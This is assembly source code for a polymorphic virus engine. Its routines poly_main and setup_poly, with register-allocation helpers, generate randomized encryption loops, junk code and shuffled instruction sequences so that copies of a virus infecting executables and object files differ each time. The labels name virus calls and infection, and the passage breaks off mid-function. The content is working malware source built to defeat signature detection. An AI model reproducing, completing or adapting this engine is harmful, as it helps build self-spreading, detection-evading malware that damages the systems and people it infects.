; routine you call to polymorphize.
ADD_FUNCTION
poly_main:	POLY_DEBUG_STRING +poly_main
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		call	_pusha
		push	rcx
		INT3_CALL free_all_regs
		and	dword [g_poly_flags],bit(RETAL_POLY_INC)\
		|bit(RETAL_POLY_O_CHECK_REG)\
		|bit(RETAL_POLY_O_SET_REG)\
		|bit(RETAL_POLY_EXE_USE_DEST)\
		|bit(RETAL_POLY_INVERT_LOOP)\
		|bit(RETAL_POLY_KEYMOD_FIRST)\
		|bit(RETAL_POLY_DEST_FIRST)\
		|bit(RETAL_POLY_RETURN_RIP_E9)\
		|bit(RETAL_POLY_BACKWARDS)\
		|bit(RETAL_POLY_MIX_CRYPT_OPS)\
		|bit(RETAL_POLY_PTR_INC_MOV)\
		|bit(RETAL_POLY_MOV_PTR_PTR)\
		|bit(RETAL_POLY_ALWAYS_PUSH_POP)\
		|bit(RETAL_POLY_CALL_VIRUS_PTR)\
		|bit(RETAL_POLY_O_SMALL_JUNK)\
		|bit(RETAL_POLY_EXE_BIG_JUNK)\
		|bit(RETAL_POLY_CALL_USE_DEST)\
		|bit(RETAL_POLY_STACK_VARS)\
		|bit(RETAL_POLY_NO_SYSCALLS)\
		|bit(RETAL_POLY_NO_JUNK_HEADER)\
		|bit(RETAL_POLY_NO_PUSHF)

		; stack vars in .o files?
		call	zf_if_ofile
		jnz	.no_s1
		bt	dword [g_poly_flags],RETAL_POLY_CALL_VIRUS_PTR
		jc	.no_s1
		btr	dword [g_poly_flags],RETAL_POLY_STACK_VARS
	.no_s1:	or	qword [reloc_offset_func],-1
		or	qword [g_max_junk_rdi],-1
		mov	byte [g_poly_last_mem_write],0
		mov	byte [g_poly_call_depth],0
		or	qword [g_poly_tail_end],-1

		lea	rdi,[g_poly_bss_base]
		mov	ecx,[g_bss_index]
		INT3_CALL do_poly_section
		mov	ecx,[g_data_index]
		INT3_CALL do_poly_section
		mov	ecx,[g_rodata_index]
		INT3_CALL do_poly_section

		lea	rax,[g_poly_junk_calls]
		mov	[g_poly_first_call],rax
		mov	[g_poly_current_call],rax

		; set start offset
		push	0
		pop	rax
		bt	dword [g_poly_flags],RETAL_POLY_BACKWARDS
		jnc	.no_backwards
		mov	eax,[g_poly_in_size]
		movzx	rbx,byte [g_word_size]
		sub	rax,rbx
	.no_backwards:
		mov	[g_poly_data_offset],rax
		mov	al,0xFF
		bt	dword [g_poly_flags],RETAL_POLY_CALL_VIRUS_PTR
		jnc	.cvr
		mov	ax,[g_src_reg]	; al = src, ah = dest
		call	zf_if_ofile
		jz	.cvr_dest
		call	cf_if_dest
		jnc	.cvr
		bt	dword [g_poly_flags],RETAL_POLY_CALL_USE_DEST
		jnc	.cvr
	.cvr_dest:
		mov	al,ah
	.cvr:	mov	[g_poly_call_virus_reg],al
		mov	rdi,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		mov	r13,[g_Poly_Encryptor_Handle+MALLOC_HANDLE.addr]
		POLY_DEBUG_RDI_R13
		add	rdi,[g_poly_in_size]
		INT3_CALL zf_if_ofile
		jz	.is_o1
		bt	dword [g_poly_flags],RETAL_POLY_EXE_BIG_JUNK
		jnc	.is_o1
		xor	rax,rax
		bt	dword [g_poly_flags],RETAL_POLY_NO_JUNK_HEADER
		jc	.save_hdr
		mov	[g_poly_header_start],rdi
		mov	eax,JUNK_SUB_MAX_SIZE * 2
		INT3_CALL rand
		lea	rdi,[rdi+rax+(JUNK_SUB_MAX_SIZE * 2)]
		lea	rax,[rdi-JUNK_SUB_MAX_SIZE]
	.save_hdr:
		mov	[g_poly_header_end],rax
	.is_o1:	push	rdi
		pop	rax
		POLY_DEBUG_STRING *in size added to RDI
		POLY_DEBUG_RDI_R13
		INT3_CALL zf_if_ofile
		jz	.rip_out_o
		INT3_CALL rax_to_vaddr
	.rip_out_o:
		mov	[g_poly_out_rip],rax
		mov	[g_poly_entry_rdi],rdi
		pop	rax
		btr	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
		bt	dword [g_poly_flags],RETAL_POLY_ALWAYS_PUSH_POP
		jc	.push_seq
		cmp	al,1
		jne	.no_push_seq
	.push_seq:
		INT3_CALL emit_push_sequence
	.no_push_seq:
		; adjust count size for 16-bit overflow
		movzx	ecx,byte [g_count_size]
		push	rcx
		cmp	ecx,2
		jne	.no_count16
		movzx	ecx,byte [g_word_size]
		mov	eax,[g_poly_in_size]
		cdq
		div	ecx
		cmp	eax,(32 * 1024)
		jb	.no_count16
		mov	byte [g_count_size],4
	.no_count16:
		mov	byte [g_current_stack_count],0
		INT3_CALL alloc_stack_vars
		INT3_CALL zf_if_ofile
		jz	.nsj1
		bts	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
	.nsj1:INT3_CALL free_all_regs
		INT3_CALL gen_o_check
		INT3_CALL load_loop_registers
		INT3_CALL junk_clear_stack
		mov	dx,[g_poly_mem_reg_dx]
		cmp	dl,-1
		je	.no_free_dx
		INT3_CALL free_word_reg_DX
		mov	word [g_poly_mem_reg_dx],-1

.no_free_dx:	; START LOOP
		mov	[g_poly_dloop_start],rdi
		mov	[g_poly_eloop_start],r13
		bts	dword [g_poly_flags],RETAL_POLY_IN_LOOP
		bts	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
		INT3_CALL big_junk
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		INT3_CALL gen_load_text
		bt	dword [g_poly_flags],RETAL_POLY_KEYMOD_FIRST
		jc	.co1
		INT3_CALL gen_key_crypts
		INT3_CALL gen_keymod_crypts
		jmp	.co2
	.co1:	INT3_CALL gen_keymod_crypts
		INT3_CALL gen_key_crypts
	.co2:	INT3_CALL gen_text_crypt
		INT3_CALL gen_store_text
		bt	dword [g_poly_flags],RETAL_POLY_DEST_FIRST
		jc	.ti1
		INT3_CALL inc_src_reg
		INT3_CALL inc_dest_reg
		jmp	.ti2
	.ti1:	INT3_CALL inc_dest_reg
		INT3_CALL inc_src_reg
	.ti2:	INT3_CALL junk_clear_stack
		btr	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
		INT3_CALL gen_loop_branch2
		INT3_CALL gen_call_virus
		INT3_CALL free_all_regs
		INT3_CALL zf_if_ofile
		jnz	.no_o_rel32
		push	rdi
		pop	rax
		mov	rbx,[g_poly_o_check_rel32]
		INT3_CALL set_rel32
		mov	rbx,[g_poly_mmap_rel32]
		INT3_CALL set_rel32
	.no_o_rel32:
		bt	dword [g_poly_flags],RETAL_POLY_STACK_VARS
		jnc	.no_clear_stack_vars
		mov	al,[g_poly_stack_var_count]
		add	[g_current_stack_count],al
	.no_clear_stack_vars:
		btr	dword [g_poly_flags],RETAL_POLY_STACK_VARS_INIT
		INT3_CALL junk_clear_stack
		btr	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
		bt	dword [g_poly_flags],RETAL_POLY_ALWAYS_PUSH_POP
		jc	.pop_seq
		cmp	dword [g_poly_entry_offset],0
		jl	.no_pop_seq
	.pop_seq:
		INT3_CALL emit_pop_sequence
	.no_pop_seq:
		pop	rax
		mov	[g_count_size],al
		INT3_CALL gen_return_rip
		mov	[g_poly_tail_start],rdi
		mov	rax,[g_poly_entry_rdi]
		mov	rax,[rax]
		mov	[g_poly_entry_8],rax
		INT3_CALL do_subroutines
		; fill subroutine header
		INT3_CALL zf_if_ofile
		jz	.hdrfilldone
		mov	rbx,[g_poly_header_end]
		test	rbx,rbx
		jz	.hdrfilldone
		mov	rdi,[g_poly_header_start]
		lea	rax,[rbx-20]
		mov	[g_max_junk_rdi],rax
		INT3_CALL small_junk
		or	qword [g_max_junk_rdi],-1
		cmp	rbx,rdi
		jb	_terminate_infection
		je	.hdrfilldone
	.hdrl:		call	rand_any
			stosb
			cmp	rdi,rbx
			jne	.hdrl
	.hdrfilldone:
		mov	rdi,[g_poly_tail_start]
		mov	rbx,[g_poly_entry_rdi]
		mov	rax,[g_poly_entry_8]
		cmp	rax,[rbx]
		jne	_terminate_infection
		END_EBLOCK_OPCODE
		sub	rdi,[g_Poly_Virus_Handle+MALLOC_HANDLE.addr]
		call	zf_if_ofile
		jnz	.store_out_size
		sub	rdi,[g_poly_in_size]
	.store_out_size:
		mov	[g_poly_out_size],rdi
%if RETAL_POLY_DUMP_ENCRYPT == RETAL_ENABLED
		call	dump_encryptor
%endif
		POLY_DEBUG_STRING +ENCRYPTOR
		call	_pusha
		call	qword [g_Poly_Encryptor_Handle+MALLOC_HANDLE.addr]
		call	_popa
		POLY_DEBUG_STRING -ENCRYPTOR
		call	_popa
		CHECK_BREAKPOINT
		POLY_DEBUG_STRING -poly_main
		ret

;-[setup_poly]----------------------------------------------------------------
; choose various polymorphic parameters
ADD_FUNCTION
setup_poly:	POLY_DEBUG_STRING +setup_poly
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		call	_pusha
		mov	byte [g_poly_setup_done],1
		; Init Flags
		INT3_CALL free_all_regs
		INT3_CALL rand_any
		and	eax,bit(RETAL_POLY_INC)\
		|bit(RETAL_POLY_O_CHECK_REG)\
		|bit(RETAL_POLY_O_SET_REG)\
		|bit(RETAL_POLY_EXE_USE_DEST)\
		|bit(RETAL_POLY_INVERT_LOOP)\
		|bit(RETAL_POLY_KEYMOD_FIRST)\
		|bit(RETAL_POLY_DEST_FIRST)\
		|bit(RETAL_POLY_RETURN_RIP_E9)\
		|bit(RETAL_POLY_BACKWARDS)\
		|bit(RETAL_POLY_MIX_CRYPT_OPS)\
		|bit(RETAL_POLY_MOV_PTR_PTR)\
		|bit(RETAL_POLY_PTR_INC_MOV)\
		|bit(RETAL_POLY_ALWAYS_PUSH_POP)\
		|bit(RETAL_POLY_CALL_VIRUS_PTR)\
		|bit(RETAL_POLY_O_SMALL_JUNK)\
		|bit(RETAL_POLY_EXE_BIG_JUNK)\
		|bit(RETAL_POLY_CALL_USE_DEST)\
		|bit(RETAL_POLY_STACK_VARS)\
		|bit(RETAL_POLY_NO_SYSCALLS)\
		|bit(RETAL_POLY_NO_JUNK_HEADER)\
		|bit(RETAL_POLY_NO_PUSHF)
		mov	[g_poly_flags],eax
		; allocate memory
		lea	r15,[g_Poly_Virus_Handle]
		mov	ebx,VIRUS_ALLOC_SIZE
		INT3_CALL malloc
		mov	ebx,4096
		add	r15,MALLOC_HANDLE_size	; g_Poly_Encryptor_Handle
		INT3_CALL malloc

		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		; Choose 'already run' value for .o infections
		mov	al,4
		push	-1
		pop	rbx
		INT3_CALL rand_prob
		js	.check_size
		jp	.check16
		mov	al,1
		shr	ebx,24
		jmp	.check_size
	.check16:
		mov	al,2
		shr	ebx,16
	.check_size:
		mov	[g_poly_o_check_size],al
	.rz1:	INT3_CALL rand_any
		and	eax,ebx
		jz	.rz1
		mov	[g_poly_check_value],eax
		lea	rsi,[poly_check_conditions]
		sets	[rsi-poly_check_conditions+check_use_S]
		setpo	[rsi-poly_check_conditions+check_use_PO]
		setl	[rsi-poly_check_conditions+check_use_L]
	.choose_init_cond:
			mov	al,POLY_CHECK_COND_COUNT
			INT3_CALL rand_al
			mov	ax,[rsi+(rax*2)]
			test	ah,ah
			jz	.choose_init_cond
		mov	[g_poly_check_condition],al
		; Choose '.o' infection mmap allocation size
		mov	ax,16384
		INT3_CALL rand_ax
		add	eax,virus_m_size
		mov	[g_poly_mmap_size],eax
		; Choose Word Size
		mov	ch,8
		INT3_CALL get_AL_1248
		mov	[g_word_size],al	; 1,2,4
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		; Choose Source, Dest regs
		INT3_CALL get_free_regr
		INT3_CALL alloc_regr
		mov	[g_src_reg],al
		INT3_CALL get_free_regr
		INT3_CALL alloc_regr
		mov	[g_dest_reg],al
		; Choose count_reg
		INT3_CALL get_free_regw
		INT3_CALL alloc_regw
		mov	[g_count_reg],al
		; Choose count size - 2,4,8
	.lsl:	mov	ch,1
		INT3_CALL get_AL_1248
		;cmp	al,2
		;jbe	.lsl
	.gls:	mov	[g_count_size],al	; 2,4,8
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		; Choose text, key,keymod regs
	.trl:	INT3_CALL get_free_reg_text
		cmp	byte [g_word_size],1
		jne	.tr
		cmp	al,_AH
		jae	.trl
	.tr:	INT3_CALL alloc_reg_text
		mov	[g_text_reg],al
		INT3_CALL get_free_reg_text
		INT3_CALL alloc_reg_text
		mov	[g_key_reg],al
		mov	al,-1
		INT3_CALL rand_prob
		js	.no_keymod			; 1/2 chance of no keymod
		INT3_CALL get_free_reg_text
		INT3_CALL alloc_reg_text
	.no_keymod:
		mov	[g_keymod_reg],al
		END_EBLOCK_OPCODE
		; Choose key, keymod init values
		BEGIN_EBLOCK_OPCODE
		INT3_CALL rand_any
		mov	[g_key_init_value],eax
		INT3_CALL rand_any
		mov	[g_keymod_init_value],eax
		; Choose loop type
		INT3_CALL choose_loop_type
		mov	[g_loop_method],rax
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		mov	al,_XOR
		INT3_CALL rand_prob
		js	.store_crypt_op
		mov	al,_ADD
		jpe	.store_crypt_op
		mov	al,_SUB
	.store_crypt_op:
		mov	[g_poly_text_crypt_op],al
		END_EBLOCK_OPCODE

		BEGIN_EBLOCK_OPCODE
		; Create push/pop reg sequence order
		lea	rdi,[g_poly_push_pop_seq]
		push	rdi
		push	16
		pop	rcx
		xor	al,al
		mov	ah,8
	.ppseq_init_lup:
			cmp	ax,0x0800 + _SP
			je	.pp_skip
			cmp	ax,8 + 0x0800
			jne	.no_r
			mov	ax,0x8800
		.no_r:	stosw
		.pp_skip:
			inc	eax
			loop	.ppseq_init_lup

		; shuffle push/pop sequence
		pop	rdi
		push	100
		pop	rcx
	.ppshuf:	mov	al,15
			INT3_CALL rand_al
			mov	bx,[(rax*2)+rdi]
			xchg	bx,[rdi]
			mov	[(rax*2)+rdi],bx
			loop	.ppshuf
	.noppseq:
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		; Create loop init call table
		lea	rsi,[LOAD_LOOP_CALL_TABLE]
		mov	bl,LOAD_LOOP_CALL_TABLE_COUNT
		INT3_CALL shuffle_call_table
		END_EBLOCK_OPCODE
		BEGIN_EBLOCK_OPCODE
		; Create MMAP set register call table
		lea	rsi,[MMAP_CALL_TABLE]
		mov	bl,MMAP_CALL_TABLE_COUNT
		INT3_CALL shuffle_call_table
		; Create Junk Syscall set register call table
		lea	rsi,[LOAD_SYSCALL_CALL_TABLE]
		mov	bl,LOAD_SYSCALL_CALL_TABLE_COUNT
		INT3_CALL shuffle_call_table
		; Set various limits
		mov	ch,1
		INT3_CALL get_AL_1248
		mov	[g_o_crypt_level],al
		INT3_CALL get_AL_1248
		add	al,al
		mov	dl,al
		mov	[g_exe_crypt_level],al
		INT3_CALL get_AL_1248
		cmp	dl,8
		jb	.sj
		cmp	al,8
		jb	.sj
		mov	al,4
	.sj:	mov	[g_junk_level],al
		xor	ch,ch
		INT3_CALL get_AL_1248
		mov 	[g_max_stack_count],al
		mov	al,8
		INT3_CALL rand_al
		inc	al
		mov	[g_poly_stack_var_count],al
		; Shuffle Junk SYSCALL table
		mov	ecx,JUNK_SYSCALLS_COUNT * 3
		lea	rsi,[junk_syscall_table]
	.sys_shuf:	mov	al,JUNK_SYSCALLS_COUNT
			call	rand_al
			shl	rax,4
			mov	rbx,[rsi+rax]
			xchg	rbx,[rsi]
			mov	[rsi+rax],rbx
			mov	rbx,[rsi+rax+8]
			xchg	rbx,[rsi+8]
			mov	[rsi+rax+8],rbx
			loop	.sys_shuf
		call	_popa
		END_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		POLY_DEBUG_STRING -setup_poly
		ret

;-[get_BH_BL_shift_mask]------------------------------------------------------
; BH = shift mask of DX
ADD_FUNCTION
get_BH_BL_shift_mask:
		BEGIN_EBLOCK_OPCODE
		mov	bh,0xF
		and	bh,dh
		shl	bh,3
		dec	bh
		END_EBLOCK_OPCODE
		ret

;-[get_AL_1248]---------------------------------------------------------------
; AL = 1,2,4,8 but not value in CH.
; CX clobbered
ADD_FUNCTION
get_AL_1248:	BEGIN_EBLOCK_OPCODE
	.l:	mov	al,4
		INT3_CALL rand_al
		mov	cl,1
		xchg	al,cl
		shl	al,cl
		cmp	al,ch
		je	.l
		END_EBLOCK_OPCODE
		ret

;-[cf_if_dest]----------------------------------------------------------------
; return CF if dest register used
ADD_FUNCTION
cf_if_dest:	POLY_DEBUG_STRING +cf_if_dest
		BEGIN_EBLOCK_OPCODE
		INT3_CALL zf_if_ofile
		je	.exit_cf
		bt	dword [g_poly_flags],RETAL_POLY_EXE_USE_DEST
		jmp	.exit
	.exit_cf:stc
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -cf_if_dest
		ret
;-[push_used_regs]------------------------------------------------------------
; push used regs using mask in ax (al = word regs, ax = r regs)
; returns mask for pop_used_regs in rax
ADD_FUNCTION
push_used_regs:	POLY_DEBUG_STRING +push_used_regs
		BEGIN_EBLOCK_OPCODE
		multipush rbx,rcx,rdx,rsi
		mov	byte [g_poly_pushed_mem_reg],-1
		mov	ecx,[g_poly_flags]
		push	rcx
		bts	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		mov	ebx,[g_wordregs]
		and	ebx,eax
		push	rbx
		xor	ecx,ecx
	.l:		shr	ebx,1
			jnc	.no_push
			cmp	cl,_SP
			je	.no_push
			lea	rsi,[free_regw]
			mov	dl,al
			mov	dh,8
			cmp	cl,_DI
			jbe	.no_rreg
			lea	rsi,[free_regr]
			mov	dh,0x88
			mov	al,0x41
			stosb
		.no_rreg:
			mov	al,cl
			and	al,7
			cmp	dx,[g_poly_mem_reg_dx]
			je	.no_free
			call	rsi
			jmp	.stos
		.no_free:
			mov	[g_poly_pushed_mem_reg],cl
		.stos:	or	al,0x50
			stosb
			inc	byte [g_current_stack_count]
			INT3_CALL small_junk
		.no_push:
			inc	ecx
			cmp	ecx,16
			jb	.l
		pop	rax
		pop	rcx
		mov	[g_poly_flags],ecx
		multipop rbx,rcx,rdx,rsi
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -puah_used_regs
		ret

;-[pop_used_regs]-------------------------------------------------------------
; pop used regs using mask in bx (bl = word regs, bh = r regs)
ADD_FUNCTION
pop_used_regs:	POLY_DEBUG_STRING +pop_used_regs
		BEGIN_EBLOCK_OPCODE
		multipush rbx,rcx,rdx
		mov	ecx,[g_poly_flags]
		push	rcx
		bts	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		push	15
		pop	rcx
	.l:		shl	bx,1
			jnc	.no_pop
			cmp	cl,_SP
			je	.no_pop
			mov	ah,8
			lea	rdx,[alloc_regw]
			cmp	cl,_DI
			jbe	.no_rreg
			lea	rdx,[alloc_regr]
			mov	ah,0x88
			mov	al,0x41
			stosb
		.no_rreg:
			mov	al,cl
			and	al,7
			cmp	cl,[g_poly_pushed_mem_reg]
			jne	.no_mem_reg
			mov	[g_poly_mem_reg_dx],ax
		.no_mem_reg:
			call	rdx
			or	al,0x58
			stosb
			dec	byte [g_current_stack_count]
			INT3_CALL small_junk
		.no_pop:dec	ecx
			jns	.l
		pop	rcx
		mov	[g_poly_flags],ecx
		multipop rbx,rcx,rdx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -pop_used_regs
		ret

;-[alloc_all_regs]------------------------------------------------------------
; mark all registers as in use.
ADD_FUNCTION
alloc_all_regs:	POLY_DEBUG_STRING +alloc_all_regs
		BEGIN_EBLOCK_OPCODE
		multipush rax,rdi,rcx
		mov	al,0xFF
		lea	rdi,[g_byteregs]
		stosb
		stosb
		stosb
		lea	rdi,[g_bytereg_table]
		push	24
		pop	rcx
		rep	stosb
		multipop rax,rdi,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -alloc_all_regs
		ret

;-[free_all_regs]-------------------------------------------------------------
; mark all regs as available (except RSP).
ADD_FUNCTION
free_all_regs:	POLY_DEBUG_STRING +free_all_regs
		BEGIN_EBLOCK_OPCODE
		multipush rax,rdi,rcx
		xor	al,al
		lea	rdi,[g_byteregs]
		stosb
		mov	al,1 << _SP
		stosb
		xor	al,al
		stosb
		lea	rdi,[g_bytereg_table]
		push	24
		pop	rcx
		rep	stosb
		mov	byte [g_wordreg_table+_SP],0xFF
		mov	word [g_poly_mem_reg_dx],-1
		multipop rax,rdi,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -free_all_regs
		ret

;-[alloc_word_reg_DX]---------------------------------------------------------
; get free word reg and allocate it, set DX appropriately
ADD_FUNCTION
alloc_word_reg_DX:
		POLY_DEBUG_STRING +alloc_word_reg_DX
		BEGIN_EBLOCK_OPCODE
		push	rax
		call	rand_prob
		js	.w
		cmp	byte [g_r_regs],-1
		je	.w
	.r:	or	dh,0x80
		call	get_free_regr
		call	alloc_regr
		jmp	.exit
	.w:	cmp	byte [g_wordregs],-1
		je	.r
		call	get_free_regw
		call	alloc_regw
	.exit:	mov	dl,al
		pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -alloc_word_reg_DX
		ret

;-[free_word_reg_DX]----------------------------------------------------------
; free word reg in DX
ADD_FUNCTION
free_word_reg_DX:
		POLY_DEBUG_STRING +free_word_reg_DX
		BEGIN_EBLOCK_OPCODE
		push	rax
		mov	al,dl
		test	dh,dh
		jns	.w
		call	free_regr
		jmp	.exit
	.w:	call	free_regw
	.exit:	pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -free_word_reg_DX
		ret

;-[get_free_reg_text]---------------------------------------------------------
; get free text size register
ADD_FUNCTION
get_free_reg_text:
		POLY_DEBUG_STRING *get_free_reg_text
		cmp	byte [g_word_size],1
		jne	get_free_regw



get_free_regb:	POLY_DEBUG_STRING +get_free_regb
		push	rbx
		lea	rbx,[g_bytereg_table]
		jmp	get_free_reg

get_free_regw:	POLY_DEBUG_STRING +get_free_regb
		push	rbx
		lea	rbx,[g_wordreg_table]
		jmp	get_free_reg

get_free_regr:	POLY_DEBUG_STRING +get_free_regb
		push	rbx
		lea	rbx,[g_rexreg_table]

get_free_reg:	mov	al,8
		call	rand_al
	.l:		and	al,7
			cmp	byte [rbx+rax],0
			je	.exit
			inc	al
			jmp	.l
	.exit:	pop	rbx
		POLY_DEBUG_STRING -get_free_reg
		ret

%if 0
;-[get_free_regb]-------------------------------------------------------------
; get unused 8 bit register xH,xL
ADD_FUNCTION
get_free_regb:	POLY_DEBUG_STRING +get_free_regb
		;BEGIN_EBLOCK_OPCODE
		push	rcx
	.l:	mov	al,8
		INT3_CALL rand_al
		push	rax
		push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		test	al,[g_byteregs]
		pop	rax
		jnz	.l
		pop	rcx
		;END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -get_free_regb
		ret

;-[get_free_regw]-------------------------------------------------------------
; get free word register rax..rdi
ADD_FUNCTION
get_free_regw:	POLY_DEBUG_STRING +get_free_regw
		;BEGIN_EBLOCK_OPCODE
		push	rcx
	.l:	mov	al,8
		INT3_CALL rand_al
		push	rax
		push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		test	al,[g_wordregs]
		pop	rax
		jnz	.l
		pop	rcx
		;END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -get_free_regw
		ret

;-[get_free_regr]-------------------------------------------------------------
; get free extended register r8..r15
ADD_FUNCTION
get_free_regr:	POLY_DEBUG_STRING +get_free_regr
		;BEGIN_EBLOCK_OPCODE
		push	rcx
	.l:	mov	al,8
		INT3_CALL rand_al
		push	rax
		push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		test	al,[g_r_regs]
		pop	rax
		jnz	.l
		pop	rcx
		;END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -get_free_regr
		ret
%endif

;-[alloc_reg_text]------------------------------------------------------------
; allocate text sized register.
ADD_FUNCTION
alloc_reg_text:	POLY_DEBUG_STRING *alloc_reg_text
		cmp	byte [g_word_size],1
		jne	alloc_regw

;-[alloc_regb]----------------------------------------------------------------
; allocate 8-bit register xH,xL
ADD_FUNCTION
alloc_regb:	POLY_DEBUG_STRING +alloc_regb
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx
		push	rax
		mov	cx,[g_poly_mem_reg_dx]
		test	ch,ch
		js	.no_mem
		mov	ch,3
		and	ch,al
		cmp	cl,ch
		jne	.no_mem
		mov	word [g_poly_mem_reg_dx],-1
	.no_mem:push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		or	[g_byteregs],al
		push	1
		pop	rax
		and	cl,3
		shl	al,cl
		or	[g_wordregs],al
		pop	rax
		movzx	rax,al
		lea	rcx,[g_bytereg_table]
		mov	byte [rcx+rax],0xFF	; byte reg
		and	al,3
		mov	byte [rcx+rax+8],0xFF	; word reg
		multipop rax,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -alloc_regb
		ret

;-[alloc_regw]----------------------------------------------------------------
; allocate word register rax..di
ADD_FUNCTION
alloc_regw:	POLY_DEBUG_STRING +alloc_regw
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx
		push	rax
		mov	cx,[g_poly_mem_reg_dx]
		test	ch,ch
		js	.no_mem
		cmp	cl,al
		jne	.no_mem
		mov	word [g_poly_mem_reg_dx],-1
	.no_mem:cmp	al,_SP
		jae	.nob
		push	rax
		push	(1 << _AL)|(1 << _AH)
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		or	[g_byteregs],al
		pop	rax
	.nob:	push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		or	[g_wordregs],al
		pop	rax
		movzx	rax,al
		lea	rcx,[g_bytereg_table]
		mov	byte [rcx+rax+8],0xFF	; word reg
		cmp	al,_SP
		jae	.nob2
		mov	byte [rcx+rax],0xFF	; byte reg low
		mov	byte [rcx+rax+4],0xFF	; byte reg hi
	.nob2:
		multipop rax,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -alloc_regw
		ret

;-[alloc_regr]----------------------------------------------------------------
; allocate extended register r8..r15
ADD_FUNCTION
alloc_regr:	POLY_DEBUG_STRING +alloc_regr
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx
		push	rax
		mov	cx,[g_poly_mem_reg_dx]
		test	ch,ch
		jns	.no_mem
		cmp	cl,al
		jne	.no_mem
		mov	word [g_poly_mem_reg_dx],-1
	.no_mem:push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		or	[g_r_regs],al
		pop	rax
		movzx	rax,al
		lea	rcx,[g_rexreg_table]
		mov	byte [rcx+rax],0xFF
		multipop rax,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -alloc_regr
		ret

;-[free_reg_text]-------------------------------------------------------------
; free text sized reg.
ADD_FUNCTION
free_reg_text:	POLY_DEBUG_STRING *free_reg_text
		cmp	byte [g_word_size],1
		jne	free_regw

;-[free_regb]-----------------------------------------------------------------
; free byte register xH,xL
ADD_FUNCTION
free_regb:	POLY_DEBUG_STRING +free_regb
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx
		push	rax
		call alloc_regb
		push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		not	al
		and	[g_byteregs],al
		and	cl,3
		mov	al,(1 << _AL)|(1 << _AH)
		shl	al,cl
		test	[g_byteregs],al
		jnz	.now
		push	1
		pop	rax
		not	al
		and	[g_wordregs],al
	.now:	pop	rax
		movzx	rax,al
		lea	rcx,[g_bytereg_table]
		mov	byte [rcx+rax],0	; byte reg
		xor	al,4
		cmp	byte [rcx+rax],0
		jne	.now2
		and	al,3
		mov	byte [rcx+rax+8],0	; word reg
	.now2:	multipop rax,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -free_regb
		ret

;-[free_regw]-----------------------------------------------------------------
; free word register rax..rdi
ADD_FUNCTION
free_regw:	POLY_DEBUG_STRING +free_regw
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx
		push	rax
		call alloc_regw
		cmp	al,_SP
		jae	.nob
		push	rax
		mov	cl,(1 << _AL)|(1 << _AH)
		xchg	eax,ecx
		shl	al,cl
		not	al
		and	[g_byteregs],al
		pop	rax
	.nob:	push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		not	al
		and	[g_wordregs],al
		pop	rax
		movzx	rax,al
		lea	rcx,[g_bytereg_table]
		mov	byte [rcx+rax+8],0	; word reg
		cmp	al,_SP
		jae	.nob2
		mov	byte [rcx+rax],0	; byte reg low
		mov	byte [rcx+rax+4],0	; byte reg hi
	.nob2:	multipop rax,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -free_regw
		ret

;-[free_regr]-----------------------------------------------------------------
; free extended register r8..r15
ADD_FUNCTION
free_regr:	POLY_DEBUG_STRING +free_regr
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx
		push	rax
		call alloc_regr
		push	1
		pop	rcx
		xchg	eax,ecx
		shl	al,cl
		not	al
		and	[g_r_regs],al
		pop	rax
		movzx	rax,al
		lea	rcx,[g_rexreg_table]
		mov	byte [rcx+rax],0
		multipop rax,rcx
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -free_regr
		ret

;-[zf_if_CL_free]-------------------------------------------------------------
; return ZF if reg in CL (using DH) is free.
ADD_FUNCTION
zf_if_CL_free:	POLY_DEBUG_STRING +zf_if_CL_free
		BEGIN_EBLOCK_OPCODE
		multipush rax,rcx,rbx
		mov	bl,1
		push	rcx
		and	cl,0x7
		shl	bl,cl
		mov	eax,[g_byteregs]
		ror	eax,16
		pop	rcx
		test	cl,cl
